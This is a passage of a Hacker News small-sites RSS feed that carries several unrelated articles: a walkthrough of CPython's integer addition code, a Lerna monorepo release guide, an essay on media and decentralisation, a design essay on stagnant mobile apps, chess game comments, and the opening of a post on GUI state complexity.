    <span>if</span> <span>(</span><span>Py_SIZE</span><span>(</span><span>a</span><span>)</span> <span>&lt;</span> <span>0</span><span>)</span> <span>{</span>
        <span>if</span> <span>(</span><span>Py_SIZE</span><span>(</span><span>b</span><span>)</span> <span>&lt;</span> <span>0</span><span>)</span> <span>{</span>
            <span>z</span> <span>=</span> <span>x_add</span><span>(</span><span>a</span><span>,</span> <span>b</span><span>);</span>
            <span>if</span> <span>(</span><span>z</span> <span>!=</span> <span>NULL</span><span>)</span> <span>{</span>
                <span>/* x_add received at least one multiple-digit int,
                   and thus z must be a multiple-digit int.
                   That also means z is not an element of
                   small_ints, so negating it in-place is safe. */</span>
                <span>assert</span><span>(</span><span>Py_REFCNT</span><span>(</span><span>z</span><span>)</span> <span>==</span> <span>1</span><span>);</span>
                <span>Py_SET_SIZE</span><span>(</span><span>z</span><span>,</span> <span>-</span><span>(</span><span>Py_SIZE</span><span>(</span><span>z</span><span>)));</span>
            <span>}</span>
        <span>}</span>
        <span>else</span>
            <span>z</span> <span>=</span> <span>x_sub</span><span>(</span><span>b</span><span>,</span> <span>a</span><span>);</span>
    <span>}</span>
    <span>else</span> <span>{</span>
        <span>if</span> <span>(</span><span>Py_SIZE</span><span>(</span><span>b</span><span>)</span> <span>&lt;</span> <span>0</span><span>)</span>
            <span>z</span> <span>=</span> <span>x_sub</span><span>(</span><span>a</span><span>,</span> <span>b</span><span>);</span>
        <span>else</span>
            <span>z</span> <span>=</span> <span>x_add</span><span>(</span><span>a</span><span>,</span> <span>b</span><span>);</span>
    <span>}</span>
    <span>return</span> <span>(</span><span>PyObject</span> <span>*</span><span>)</span><span>z</span><span>;</span>
<span>}</span></code></pre></figure>

<p>First we check that the two integers are valid.</p>

<figure><pre><code data-lang="c"><span>#define CHECK_BINOP(v,w)                                \
    do {                                                \
        if (!PyLong_Check(v) || !PyLong_Check(w))       \
            Py_RETURN_NOTIMPLEMENTED;                   \
    } while(0)</span></code></pre></figure>

<p>One curious thing you may have noticed is the :</p>

<figure><pre><code data-lang="c"><span>do</span> <span>{</span>
	<span>INSTR</span><span>;</span>
<span>}</span> <span>while</span><span>(</span><span>0</span><span>)</span></code></pre></figure>

<p>Which seems exactly the same as simply :</p>

<figure><pre><code data-lang="c"><span>INST</span><span>;</span></code></pre></figure>

<p>The purpose of doing this is macros in C are not really smart, the <em>preprocessor</em> will simply do a find/replace and hope for the best. The problem with this can be illustrated with the following macro :</p>

<figure><pre><code data-lang="c"><span>#define fct() \
	INSTR1; \
	INSTR2; </span><span>\</span></code></pre></figure>

<p>But what happens if you do :</p>

<figure><pre><code data-lang="c"><span>if</span><span>(</span><span>condition</span><span>)</span>
	<span>fct</span><span>()</span>
<span>else</span>
	<span>INSTR3</span><span>;</span></code></pre></figure>

<p>the preprocessor will replace this with :</p>

<figure><pre><code data-lang="c"><span>if</span><span>(</span><span>condition</span><span>)</span>
	<span>INSTR1</span><span>;</span>
<span>INSTR2</span><span>;</span>
<span>else</span>
	<span>INSTR</span><span>;</span></code></pre></figure>

<p>which is not valid <em>C</em>, since in <em>C</em> if you omit the braces, the if body will only consists of the first instruction which is not what you would expect.</p>

<p>The do while solve this by enclosing all our instructions in one scope.</p>

<p>But why not just use :</p>

<figure><pre><code data-lang="c"><span>{</span>
	<span>INSTR1</span><span>;</span>
	<span>INSTR2</span><span>;</span>
<span>}</span></code></pre></figure>

<p>As far as i know this is simply a syntaxic choice, since writing <code>MACRO();</code> is more natural than <code>MACRO()</code> (not that in the second case we have no semicolon).</p>

<p>The rest is :</p>

<ul>
  <li>if both a and b are negative we return -|a + b|</li>
  <li>if a is negative but not b we compute b - a</li>
  <li>if b is negative and a is positive we compute a - b</li>
  <li>if both are positive we compute |a + b|</li>
</ul>

<p>This looks fairly complicated for a simple a + b, so why all the burden ?</p>

<p>Well recall that in <code>Python</code> integers can be very large (2^63 digits on 64 bits machines), this is achieved by storing the integers in arrays (each element representing a digit).</p>

<p>We dive in the <code>x_add</code> code we see :</p>

<figure><pre><code data-lang="c"><span>for</span> <span>(</span><span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>size_b</span><span>;</span> <span>++</span><span>i</span><span>)</span> <span>{</span>
        <span>carry</span> <span>+=</span> <span>a</span><span>-&gt;</span><span>ob_digit</span><span>[</span><span>i</span><span>]</span> <span>+</span> <span>b</span><span>-&gt;</span><span>ob_digit</span><span>[</span><span>i</span><span>];</span>
        <span>z</span><span>-&gt;</span><span>ob_digit</span><span>[</span><span>i</span><span>]</span> <span>=</span> <span>carry</span> <span>&amp;</span> <span>PyLong_MASK</span><span>;</span>
        <span>carry</span> <span>&gt;&gt;=</span> <span>PyLong_SHIFT</span><span>;</span>
    <span>}</span>
    <span>for</span> <span>(;</span> <span>i</span> <span>&lt;</span> <span>size_a</span><span>;</span> <span>++</span><span>i</span><span>)</span> <span>{</span>
        <span>carry</span> <span>+=</span> <span>a</span><span>-&gt;</span><span>ob_digit</span><span>[</span><span>i</span><span>];</span>
        <span>z</span><span>-&gt;</span><span>ob_digit</span><span>[</span><span>i</span><span>]</span> <span>=</span> <span>carry</span> <span>&amp;</span> <span>PyLong_MASK</span><span>;</span>
        <span>carry</span> <span>&gt;&gt;=</span> <span>PyLong_SHIFT</span><span>;</span>
    <span>}</span>
    <span>z</span><span>-&gt;</span><span>ob_digit</span><span>[</span><span>i</span><span>]</span> <span>=</span> <span>carry</span><span>;</span></code></pre></figure>

<h2 id="conclusion">Conclusion</h2>
<p>And that‚Äôs it, the <code>long_sub</code> is fairly similar, and you can always (i encourage you to do so) check multiplication and division code.</p>

<p>We rarely stop to think about basic operations like integer operations, the longobject file shows use how complex and optimised long/integers implementation is in python.</p>

</div>





      </div></div>]]>
            </description>
            <link>http://ykarroum.com/2021/01/10/intobject/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26131703</guid>
            <pubDate>Sun, 14 Feb 2021 12:09:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Automated release process for (Lerna) monorepo]]>
            </title>
            <description>
<![CDATA[
Score 17 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26131545">thread link</a>) | @kiyanwang
<br/>
February 14, 2021 | https://sudolabs.io/blog/automated-release-process-for-lerna-monorepo | <a href="https://web.archive.org/web/*/https://sudolabs.io/blog/automated-release-process-for-lerna-monorepo">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>The process of publishing (releasing) a new version of software is <em>one of the most important steps</em> in a development lifecycle. In this article, we will take a look at how we can <strong>automate</strong> this in a monorepository managed with <a target="_blank" href="https://lerna.js.org/">lerna</a>.</p><h2>Motivation</h2><p>The most important things in the release process are <em>simplicity</em>, <em>consistency</em>, and <em>clarity</em>. A release process should be <em>straightforward</em>, so everybody on the team can do it <strong>easily by following a clear set of instructions</strong>. During the release process, a lot of things can go wrong - you forget to set a new version, modify the version in any of the <code>package.json</code> files, or even forget to create a new tag or merge hotfixes from the <code>master</code> branch. Therefore, <strong>it's good to clearly define this process and automatize it as much as possible</strong>.</p><h2>Goals</h2><p>The main goal of this article is to <strong>define the release process</strong> for monorepo using Lerna. It consists of the <em>automatic creation of tags, incrementing the version, and changelog generation with the chronological arrangement of changes</em>.</p><h2>Project structure</h2><p>For this project, we will be using a monorepo with two packages/modules: <code>api</code> and <code>frontend</code>. In the root folder, we have packages, root <code>package.json</code>, and Lerna config.</p><pre><code>+-- api
| +-- package.json
| +-- ...
+-- frontend
| +-- package.json
| +-- ...
+-- CHANGELOG.md
+-- lerna.json
+-- package.json
+-- ...</code></pre><p>In this article, we are fixed to monorepo projects managed by <code>lerna</code>. That means that you should be able to use this process with any project using this structure (maybe with some little changes in configs). <strong><em>You can find valuable information in this article even if you are not using this kind of setup</em></strong>.</p><h2>Setup</h2><p>In our release process solution, we are using a <em>combination</em> of <code>GitHub</code>, <code>lerna</code> and <code>lerna-changelog</code>.</p><h3>Lerna</h3><p>Lerna is a library that provides tooling to manage multi-package structure inside a single repository (sometimes called monorepos). Our main usage of <code>lerna</code> is for <em>automatic versioning and tag generation</em>. We are using <code>lerna</code> with the combination of <code>lerna-changelog</code> package which is used to <em>generate a changelog</em> based on the labels attached to PRs merged into the origin.</p><p>In the root of the project run <code>npm i -s -d lerna</code> (we are currently using <code>3.22.1</code>).
Create <code>lerna</code> configuration file (<code>lerna.json</code>).</p><pre><code>{
	"packages": [
		"./*"
	],
	"version": "{{your_current_repository_version}}"
}</code></pre><ul><li>packages - Array of globs to use as package locations (locations of your <strong>not</strong> root <code>package.json</code> files)</li><li>version - the current version of the project (from the root <code>package.json</code>)
More <code>lerna</code> config options can be found <a target="_blank" href="https://github.com/lerna/lerna#lernajson">here</a>.</li></ul><h3>Lerna-changelog</h3><p>In the root of the project run <code>npm i -s -d lerna-changelog</code> (we are currently using <code>1.0.1</code>)
In the root <code>package.json</code> file we need to add config for <code>lerna-changelog</code>. You can map PR labels from Github to more meaningful titles here.</p><pre><code>"changelog": {
	"labels": {
		"Type: Feature": "Features",
		"Type: Bug": "Bug fixes",
		"Type: Enhancement": "Enhancements"
	},
},</code></pre><p>More options can be found in <a target="_blank" href="https://github.com/lerna/lerna-changelog#configuration">lerna-changelog doc</a>.</p><p>For changelog generation, you'll need a <a target="_blank" href="https://docs.github.com/en/github/authenticating-to-github/creating-a-personal-access-token#using-a-token-on-the-command-line">personal access token</a> for the GitHub API with the <code>repo</code> scope for private repositories or just <code>public_repo</code> scope for public repositories.</p><p>You can set the environment variable for the GitHub authentication by running this command:</p><pre><code>export GITHUB_AUTH="&lt;Your Github personal access token&gt;"</code></pre><p>or even better, define this variable in your <code>.bash_profile</code></p><h2>Git workflow</h2><p>To understand this process you have to be familiar with <code>git-flow</code>. In our case, it's based on three main branches:</p><ul><li>develop</li><li>staging</li><li>master</li></ul><p>All <strong>new features or non-critical bug fixes are merged into the develop branch.</strong> When it's time for a new release (typically at the end of the sprint), <strong>all changes from develop are merged into staging branch</strong>, where <strong>we test it</strong> thoroughly if everything is working fine. After that we <strong>merge staging into the master branch</strong>.</p><h2>Release process</h2><p>A new release is introduced by creating a new git tag and bumping versions of packages.
These are done in a semi-automatized way with <a target="_blank" href="https://github.com/lerna/lerna/tree/master/commands/version">lerna</a>.</p><h3>Creating a Release Candidate with changelog</h3><p>Over the time, we figured out these few basic steps to create a release candidate:</p><ol><li>Pull the latest changes from <code>origin</code> to <code>master</code>, <code>staging</code>, <code>develop</code> branches to your local repository</li><li>Checkout into the <code>develop</code> branch and make sure you have all bug fixes from <code>master</code> merged to <code>develop</code></li><li>Run <code>npx lerna-changelog</code> to generate a changelog and append it to the <code>CHANGELOG.md</code></li><li>Commit new <code>CHANGELOG.md</code> on <code>develop</code></li><li>Run <code>npx lerna version</code> and choose the appropriate version number.<ol><li>This will update <code>version</code> properties for all updated packages</li><li>Commit all the changes</li><li>Create a new <code>git tag</code> on the new commit</li></ol></li><li>Push changes to the <code>origin</code></li><li>Merge <code>develop</code> into <code>staging</code> branch</li><li>Push staging to <code>origin</code></li><li>Create a new <em>Pull Request</em> with a base set as <code>master</code> from <code>staging</code> branch</li><li>Copy changes from <code>CHANGELOG.md</code> and attach to the <em>PR</em> body with <code>- [ ]</code> list items to render a <em>TODO</em> list (<code>- [ ]</code> is rendered as a checkbox)</li><li>Let your team know that there is a <em>Release Candidate</em> and wait until they will check every feature / bugfix they've merged</li><li>When all checkboxes (all features / bugfixes) are checked and the <em>PR</em> is approved, <strong>merge</strong> it. <strong><em>Don't squash</em></strong> merge as it might cause conflicts for developed features</li></ol><p>Example of <em>PR</em> from staging to master.
</p><h3>When to release?</h3><p>It's hard to say exactly. There are few points that you should think of:</p><ul><li><strong>Do not release in rush</strong> - you should have enough time to fix any problem during and after release. There is always something unpredictable that can happen. Maybe you have forgotten to set a new environment variable or a migration has crashed.</li><li>You should release when there are as minimum customers as possible using the product - any error can occur and that can have a negative influence on their experience with the product. Impact on the customer experience could be minimized by using strategies like <a target="_blank" href="https://martinfowler.com/bliki/BlueGreenDeployment.html">blue-green deployment</a> or <a target="_blank" href="https://martinfowler.com/bliki/CanaryRelease.html">canary releases</a>.</li><li>You should be <strong>sure of the code you are releasing</strong>.</li></ul><h3>How often to release?</h3><p>The best option is to <strong>release in periodic intervals</strong>, such as one sprint. Periodicity is one of the most important factors. <strong>You don't want to release hundreds of hours of work at once</strong>. It's much easier to release smaller features <em>more often</em>, than one big feature after two months. Last but not least, there is a customer that wants to see some progress on his project as well. <strong>It's not a problem to release more often then you need to</strong>, but before every release, <strong>don't forget to check the points in the "When to release" paragraph!</strong></p><h2>Conclusion</h2><p>In this article we've walked through the release process by <strong>creating a changelog with minimum effort</strong>. We've talked about a workflow and the tools we are currently using, and our method of creating a release candidate. As always, there is a lot of space to improve, e.g. it would be nice to automatize creating PR from <code>staging</code> to <code>master</code> branch with changelog description.</p></div></div></div>]]>
            </description>
            <link>https://sudolabs.io/blog/automated-release-process-for-lerna-monorepo</link>
            <guid isPermaLink="false">hacker-news-small-sites-26131545</guid>
            <pubDate>Sun, 14 Feb 2021 11:43:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How I wrote 1000 blogs in 1000 days?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26131421">thread link</a>) | @choubeysahab
<br/>
February 14, 2021 | https://choubeysahab.com/how-i-wrote-1000-blogs-in-1000-days/ | <a href="https://web.archive.org/web/*/https://choubeysahab.com/how-i-wrote-1000-blogs-in-1000-days/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://choubeysahab.com/how-i-wrote-1000-blogs-in-1000-days/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26131421</guid>
            <pubDate>Sun, 14 Feb 2021 11:26:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Billion Mockingbirds: The Role of Journalists in Destroyed Civilization]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26131359">thread link</a>) | @yetanothermonk
<br/>
February 14, 2021 | https://macrobullshit.com/archive/billion-mockingbirds/ | <a href="https://web.archive.org/web/*/https://macrobullshit.com/archive/billion-mockingbirds/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>Today, we're seeing the erosion of trust in companies, governments, money, and media.</p><p>It's difficult to replace these four core pillars, but it is necessary. Diminishing trust in these institutions makes way for alternatives and new forms of storytelling, conversation, and analysis to accompany transactions, ledgers, and hashes.</p><p>Media is perhaps the most malleable pillar, but it is also the most influential pillar. Historically, edges were drawn between media and the other three pillars: corporations, government, and fiat money depend on reputation and thus media support to shape public opinion, consent, and consensus.</p><p>Journalists, in their vendetta against the new disruptive players to their inherited distribution, catalyzed the move to a post-propaganda media. Through actions sparked by anxious fear of losing relevance, they led us to a post-ideological era by encouraging the construction of counter-narrative competition. They used traditional rhetoric and squandered accrued trust to criticize, mock, and belittle. They are suffering the consequences; individual creators instead are taking on the mantle to create, inform, and improve.</p><p>Twenty years ago, we would grimace and bear the realities of an -opolistic arrangement of "truth"-papers. But in a post-bitcoin, post-blockchain world, we can compile truth from decentralized ledgers, open source software, and peer-to-peer transmission of information by layering compelling narrative onto verified facts.</p><p>With these tools, we can produce a media industry that is entirely different than the centralized, institutionally backed, narrative-tampered one we've endured for the last century. Decentralized technology provides us with an opportunity to level the playing field. As a result, humans are free to participate in media as they please: everyone will be at once both journalists and readers. </p><p>Because the key value proposition of bitcoin is the outsourcing of trust so humans can organize in novel, more efficient, more scalable ways, media itself is bending towards these new laws of bits.</p><p>Post-propaganda media is an ideal state where we act as storytellers for each other, parse truth for our audiences, and feed into a shared understanding of the world we live in. It is a place for writers to tell their story, for readers to participate in it, and for technologists to facilitate the process without being beholden to decaying ideological institutions. This evolving chaotic primordial soup at the intersection of journalism, cryptography, and entrepreneurship is the ideal home for post-propaganda media to take root. </p><p>This new model supports an arbitrary number of perspectives; any reader can promote any story being blocked by a gatekeeper; and the people you "follow" can stake (with reputation and money) support for particular content. </p><p>Like it always has, media must serve the reader; the difference in post-propaganda media is the increased variance of interest and the increased number of sources and pseudo-sources. The internet increases variance of interest by enabling frictionless dives into infinitely deep pools of knowledge. If every reader is a sink, the major sources of the past century have been a few journalists and papers; the major sources of the past century will be different for each person; the pseudo-sources will be fact-checker nodes that verify and "gate" regions of truth. None will be labeled as trusted; instead, each content creator will have earned the trust of their reader. It's a new era.</p><p>If that is the vision of the post-propaganda future, what does a journalist have to do with it--especially with destroying civilization?</p><p>Civilization moves towards valleys of truth. The algorithms that have controlled this gradient descent have built themselves upon the assumption global truths. The algorithms that will control this search problem in the cryptographic future are built instead on locality and fractal truths in a complex web of narratives.</p><p>That which emerges will have earned it through merit instead of inherited it through legacy distribution. Because the valleys of truth are being destroyed--or, more accurately, proliferating in number--and journalists, trapped in spirals of constraining culture and confusion, only serve to quicken the proliferation, they are simultaneously destroying themselves/the institutions they love but also our very conception of civilization. "Dank memes" are the current best example: though memes seem silly, they are quite serious as the lightning-quick reproductions of intersubjective understanding for vast swaths of the population (precisely the swaths that want memes to be part of their group truth and identity).</p><p>Journalism and civilization itself are at an inflection point between confusion and explosion. The consistent thing between both sides at time <em>t</em> is the silent absence of the current holders of power: the precise greatest fear of the media is to not be talked about, and that day is coming.</p><p>Yesterday, we put up with them. Today, we fight them.</p><p>Tomorrow, we forget they even exist.</p>

    

    <div>
      <h2>Subscribe to Macrobullshit</h2>
      <p>Subscribe to the newsletter and unlock access to member-only content.</p>
      

    </div>

  </div></div>]]>
            </description>
            <link>https://macrobullshit.com/archive/billion-mockingbirds/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26131359</guid>
            <pubDate>Sun, 14 Feb 2021 11:14:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Honor the Material]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26131357">thread link</a>) | @burntcaramel
<br/>
February 14, 2021 | https://www.andy.works/words/honor-the-material | <a href="https://web.archive.org/web/*/https://www.andy.works/words/honor-the-material">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>It's Fall, which means we get to see all of the phone makers announce their latest models promising to be the "best phones we've ever built". While the yearly ritual has become routine to the point where the media reviews are almost written in advance, it's easy to lose sight of the bigger picture of just how far these devices have advanced over the past 13 years.</p><p>Consider the technical differences between the new iPhone 12 and the original iPhone from 2007: screen resolution has increased <strong>23X</strong>, CPU performance by <strong>350X</strong>, and graphics performance by a whopping <strong>700X</strong>! Even by tech industry standards, these numbers are staggering.</p><p>Imagine for a moment that you're at the original iPhone announcement in 2007 and you bump into a time traveler from 2020 who tells you how mobile hardware advancements would surpass Moore's law over the coming 13 years and that we'd all be running high-end gaming computers in our pockets. You could only imagine the mind-blowing software experiences that would surely be unlocked by that immense power.</p><p>Well, this is where you'd be a bit underwhelmed‚Ä¶</p><figure><p><img src="https://assets.website-files.com/5f52cb73016fed9a30bb4d95/5f9efacf9cb4095d820ecc95_13-years.png" loading="lazy" alt=""></p></figure><h4>I </h4><h3>Apps have fallen behind</h3><p>Despite the exponential leaps in hardware capabilities, many of the apps that we rely on every day aren't much different from what they were 13 years ago.</p><p>Pick your own favorite app. Has it seen exponential transformation or minor iteration? Likely the latter. Even the most innovative apps rely on the same foundations that were laid 13 years ago. Fundamentally, our approach to software design hasn't evolved so much as been optimized. And while, we have a few fancy new tools like augmented reality and machine learning, the reality is that much of our everyday experiences are still shaped by the same essential apps like Weather, Calculators, Alarms, and Timers that we have to interface with daily. It's these that have seemingly been left behind.</p><h3>We are holding phones from the future, running software designed a decade ago.</h3><p>Perhaps these everyday apps haven't changed much because they're "classic" designs? The problem is that you don't have to dig deep to find that most have ample room for improvement. The Calculator app is the most error-prone calculator I've ever used regularly hitting wrong numbers and never knowing it because of its insistence on sticking to its analog metaphor, shortcomings and all. The Alarm app is just broken. If you're like me and the 40 other people I've asked, you probably have a long list of 30+ alarms set for every time you've ever woken up: 8:00, 8:10, 8:15, 8:18, 8:22, 8:50‚Ä¶ It points to a fundamental flaw in the model that makes it easier to add a new alarm time than edit an existing one. It's bad enough that I use it as a redesign exercise for my Intro to Interaction Design students.</p><p>The issues extend further to the visual design of these apps which often still hold the stamp of their origins on a small 3:2 phone. Look no further than the awkward empty space on the Calculator and Timer. These are signs that, despite this being the default software used by billions, it's just not a big priority.</p><figure><p><img src="https://assets.website-files.com/5f52cb73016fed9a30bb4d95/5f9efafd45546d7414ef43cb_apps.png" loading="lazy" alt=""></p></figure><p>If you've worked on large software products, this of course, comes as no shock. You know that the moment you release a product, you incur a sort of debt, and the longer your product continues, the greater that debt grows and the riskier it becomes to fundamentally shift that product in a new direction (ex: <a href="https://www.theverge.com/2018/8/7/17661878/snapchat-earnings-q2-2018-results-redesign">Snapchat</a>). Plus, let's be honest, no one is buying a phone primarily for the default apps in this day and age. All of this means, there's little incentive for a company to rock the boat with its default software used by billions. Besides, these apps come pre-installed. It's not as if they have to compete alongside others in the App Store on their merits.</p><p>They've had over a decade to fix them and haven't. Do what others can't.</p><h4>II</h4><h3>Honor the material</h3><p>In my last article <a href="https://www.andy.works/words/building-a-belief-system"><em>Building a Belief System</em></a>, I shared a bit about my obsession with woodworking. Wood is a wonderfully versatile material. You can build almost <em>anything</em> out of wood and some woodworkers try. But you shouldn't. Wood is great for some things (big, flat surfaces like a tabletop) and poor at others (weight-bearing structures like legs). Steel, however, <em>is</em> great for structure due to its strength, but it would make a poor tabletop. This is to say something plainly obvious‚Äîevery material is good at something and poor at something else.</p><p>Designers Charles and Ray Eames were masters with materials. More than any other mid-century furniture designers, they knew the strengths of their materials. In 1950, they designed a <a href="https://store.hermanmiller.com/living/chairs/eames-molded-plastic-rocker-rar/850.html">molded plastic armchair</a> that showcases this. It consists of a fibreglass-reinforced plastic seat that is both easily-molded and flexes for comfort, a metal base truss structure for carrying weight and offering rigidity while staying light, and hardwood rockers for a solid yet forgiving material that won't damage your floors. Three different materials, each playing to its own strength, and yet all brought together beautifully in form and purpose.</p><figure><p><img src="https://assets.website-files.com/5f52cb73016fed9a30bb4d95/5f9efb1c102f97a385f9f6fa_eames-plastic-armchair-rar-1.jpg" loading="lazy" alt=""></p></figure><p>To honor a material is to celebrate its unique properties and utilize its strengths. It's using a material to its full potential because it would be wasteful not to.</p><h4>III</h4><h3>Craft</h3><p>We're taught that technology shouldn't drive solutions, but that solutions should be driven by needs. And that is true. But as I've matured as a Designer, I've come to realize that it's not the full truth.</p><p>In software, anything seems possible. As Product Designers, we'd like to believe that we can imagine any form and build it. But software, like wood, has grain. Some things are easy to do and others are difficult. Move with the grain, and you can unlock amazing experiences. Cut against the grain, and you will struggle with even the most basic tasks. It's common for young designers to propose designs that are either impossible or too costly to build. It's okay‚Äîyou're learning the grain.</p><p>Craft is truly knowing your materials‚Äîtheir strengths and weaknesses. Great Design knows how to honor those materials by marrying real needs with what a platform and device can deliver.</p><h3>This is on us</h3><p><a href="https://www.andy.works/words/no-more-boring-apps">Our apps are boring</a>. We carry around incredible graphics machines that can churn through a multi-player 3D game at 60fps with cycles to spare, and we're using them to render flat rectangles. It's not that everything we do has to always push the capabilities to the max, but we need to recognize that modern day mobile devices are fundamentally different from those a decade ago. It's a new "material," and it's on us to develop new approaches that better honor this material by utilizing its full capabilities to solve real needs and unlock new software experiences.</p><p>If you're working on a product that's struggling to evolve, there's a question you can ask yourself: If you could throw everything out‚Äîscrap all the legacy, the systems, the patterns‚Äîand start over today, what would it look like? How would you honor the material?</p><p>‚Äç</p></div></div>]]>
            </description>
            <link>https://www.andy.works/words/honor-the-material</link>
            <guid isPermaLink="false">hacker-news-small-sites-26131357</guid>
            <pubDate>Sun, 14 Feb 2021 11:14:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: TestHub ‚Äì aggregate and track tests and coverage across projects]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26131336">thread link</a>) | @orsol
<br/>
February 14, 2021 | https://test-hub.io/testhub-io-examples | <a href="https://web.archive.org/web/*/https://test-hub.io/testhub-io-examples">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://test-hub.io/testhub-io-examples</link>
            <guid isPermaLink="false">hacker-news-small-sites-26131336</guid>
            <pubDate>Sun, 14 Feb 2021 11:10:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Chess AI]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26131183">thread link</a>) | @hggh
<br/>
February 14, 2021 | https://sebastian.itch.io/chess-ai | <a href="https://web.archive.org/web/*/https://sebastian.itch.io/chess-ai">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-post="{&quot;user_id&quot;:1709476,&quot;id&quot;:2606576}" id="post-2606576"><div><a href="https://itch.io/profile/pixelplant"></a><div><div><p>It took me an hour to beat the AI. The AI is difficult imo.&nbsp;</p><p>10/10, would play again.</p>
<p>1. e4 d6&nbsp;2. d4 Nf6 3. Nc3 g6 4. Be3 Nbd7 5. Qd2 e5 6. f3 exd4 7. Bxd4 Be7 8. Qh6 c5 9. Bf2 Qb6 10. Rb1 Bf8 11. Qd2 Bg7 12. Nb5 Bf8 13. Rd1 a6 14. Nxd6+ Bxd6 15. Qxd6 Qxb2 16. Bh4 Qc3+ 17. Rd2 Ng8 18. Ne2 Qa1+ 19. Rd1 Qb2 20. c3 g5 21. Bxg5 f6 22. Qe6+ Kf8 23. Bf4 Qb5 24. Bd6+ Kg7 25. Nf4 Qc6 26. Nh5+ Kg6 27. Qe8+ Kg5 28. Bf4+ Kh4 29. g3#&nbsp;<span></span><span></span></p></div></div></div></div><div data-post="{&quot;user_id&quot;:3932109,&quot;id&quot;:2602619}" id="post-2602619"><div><a href="https://itch.io/profile/ankitminz"></a><div><p>I lost every game lol. Pretty strong AI for beginners.</p></div></div></div><div data-post="{&quot;user_id&quot;:3228104,&quot;id&quot;:2601967}" id="post-2601967"><div><a href="https://itch.io/profile/nivmizzer"></a><div><p>Very impressive, cool to see someone use Unity to make the classic chess AI problem!</p></div></div></div></div>]]>
            </description>
            <link>https://sebastian.itch.io/chess-ai</link>
            <guid isPermaLink="false">hacker-news-small-sites-26131183</guid>
            <pubDate>Sun, 14 Feb 2021 10:42:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The complexity that lives in the GUI]]>
            </title>
            <description>
<![CDATA[
Score 343 | Comments 191 (<a href="https://news.ycombinator.com/item?id=26131178">thread link</a>) | @yes_but_no
<br/>
February 14, 2021 | https://blog.royalsloth.eu/posts/the-complexity-that-lives-in-the-gui/ | <a href="https://web.archive.org/web/*/https://blog.royalsloth.eu/posts/the-complexity-that-lives-in-the-gui/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The user interfaces are a weird thing. There are all sorts of libraries and frameworks that
are supposed to help you on your journey of writing a GUI, but despite all the best practices and
frameworks forcing you to eat your vegetables, the GUI always ends up being a ridiculous mess.
After pondering some more about this topic, I‚Äôve finally realized what is the cause of this problem.</p><p>Suppose you start working on a greenfield project for managing a warehouse (gasp).
This GUI has everything that a warehouse owner desires, including the irrelevant oversized
side bar on the left that scores upvotes on the design related social networks.
The user avatar with the details of logged
in user are on the left, inventory table is in the middle and all kinds of buttons are everywhere else.</p><p>If I asked you to architect such application from the given user interface concept,
you would probably start to mentally compose parts of the GUI into boxes with labels such as:
UserSection, InventoryTable, BottomActionButtons and so on.
These days such labeled boxes are commonly put into separate classes. Classes are a great building
blocks for the GUI, because they let you divide the complexity into smaller parts each containing
just the internal state of one little component.
When you are programming an inventory table in the middle you don‚Äôt want to care about the complexity
surrounding the user avatar section. In other words, if you are organizing the stuff in box A
you don‚Äôt care about the mess that resides in box B.</p><p>For a while this strategy of ‚Äúmess in other boxes is not my problem‚Äù works, but soon enough you hit the next
challenge. Suppose the user section of the warehouse GUI has a little light called ‚ÄúWorking‚Äù.
If the user is editing the inventory table that light should be displayed in green and when the user
stops editing, the light should be turned back to gray.</p><p>Oops, the ‚Äúmess in other boxes‚Äù is your problem now as you have to connect the editing state
of the inventory table with the state of the light in the user avatar section.
You find yourself at the crossroads of important design decisions.</p><ul><li><p><strong>Connect the boxes</strong>: create the user avatar component and pass its instance to the inventory
table component. Whenever the edit state of the inventory table changes, the business logic in
the inventory table should also trigger a state change in the user avatar component with the help
of the user avatar‚Äôs public API.</p></li><li><p><strong>Lift the state up</strong>: move the internal state of the user avatar component
and the state of the inventory table into a separate box/class. The logic of the user avatar
and inventory table component will still be neatly separated in their own boxes,
but they will be able to communicate without inventory table needing the direct access to the user avatar.</p></li><li><p><strong>Introduce a message bus</strong>: connect the inventory table and the user avatar component to the shared
pipe that is used for distributing events in the application. The user avatar component subscribes to
the message bus and every time it receives a table edit event,
it executes an appropriate action (e.g turn the light on).</p></li></ul><p>It goes without saying, that none of the presented options are without problems.</p><h3 id="connect-the-boxes">Connect the boxes</h3><p>If you‚Äôve decided to chicken out of introducing another layer for holding the common state, you may
solve this cross box communication problem by injecting the user avatar component directly into the
inventory table component. The programming theorists and other purists will tell you that this is a bad idea
and you should never even think about it. Think about the <del>children</del>, err,
all the tests that you won‚Äôt be able to write.</p><p>I am definitely guilty of such crime against the Holy Church of Unit Testers. When the project is
still in its infancy and I have yet to figure out what am I even building, I like to jam the
components together without giving it much thought. Sometimes you cut the corners, and sometimes
